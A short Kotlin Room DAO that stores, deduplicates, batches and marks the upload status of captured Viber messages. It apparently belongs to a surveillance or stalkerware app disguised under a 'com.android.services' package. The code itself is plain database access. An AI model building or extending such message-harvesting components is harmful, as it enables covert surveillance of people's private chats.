package com.android.services.db.dao

import androidx.room.Dao
import androidx.room.Insert
import androidx.room.OnConflictStrategy
import androidx.room.Query
import com.android.services.db.entities.ViberUnrooted
import com.android.services.util.AppConstants

@Dao
interface ViberUnrootedDao {

    @Insert(onConflict = OnConflictStrategy.IGNORE)
    fun insert(imoUnrooted: ViberUnrooted)

    @Query("Select uniqueId from viber_unrooted_table where uniqueId = :messageId")
    fun checkViberIfAlreadyExist(messageId: String): String?

    @Query("Select * from viber_unrooted_table where status = :status order by id ASC limit ${AppConstants.imLogsUploadLimit}")
    fun selectAllViberUnrootedLogs(status: Int): List<ViberUnrooted>

    @Query("Update viber_unrooted_table set status = :updated_status where id BETWEEN :startId AND :endId")
    fun update(startId: Int, endId: Int, updated_status: Int): Int
}